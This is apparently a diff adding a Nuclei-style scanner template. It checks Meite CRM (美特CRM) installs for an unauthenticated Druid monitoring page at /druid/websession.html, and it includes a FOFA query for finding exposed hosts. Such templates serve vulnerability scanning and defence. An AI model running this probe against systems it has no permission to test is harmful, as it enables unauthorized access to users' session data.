@@ -1,0 +1,33 @@
+id: poc-gh63qkysf0hc3no1
+info:
+  name: 美特CRM Druid组存在未授权访问漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gh63qkysf0hc3no1'
+  tags: unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gh63qkysf0hc3no1
+    fofa: body="/common/scripts/basic.js"
+http:
+- raw:
+  - 'GET /druid/websession.html HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Upgrade-Insecure-Requests: 1
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Accept-Encoding: gzip, deflate
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cache-Control: max-age=0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
